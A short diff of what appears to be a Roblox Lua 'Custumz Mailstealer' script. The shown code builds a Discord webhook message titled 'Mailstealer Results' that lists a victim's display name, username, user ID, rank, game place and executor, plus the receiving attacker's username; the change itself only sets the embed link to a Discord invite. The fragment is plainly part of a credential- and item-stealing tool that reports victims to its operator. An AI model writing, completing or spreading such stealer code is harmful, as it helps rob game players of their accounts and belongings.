@@ -35,7 +35,7 @@ local msg = {
 	  {
 		["title"]= "`Custumz Mailstealer Results`",
 		["description"]= "**Data from the victim**\n```🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\n☠Executor: "..exploit.."\n📮Receiver: ".._G.Username.."```",
-		["url"]= "join my sever",
+		["url"]= "https://discord.gg/VZX6jGKgxw",
 		["color"]= ""..webhookcolor.."",
 		["thumbnail"] = {
         ["url"] = "https://cdn.discordapp.com/attachments/1077585452309155850/1106236489819496448/cat.png",
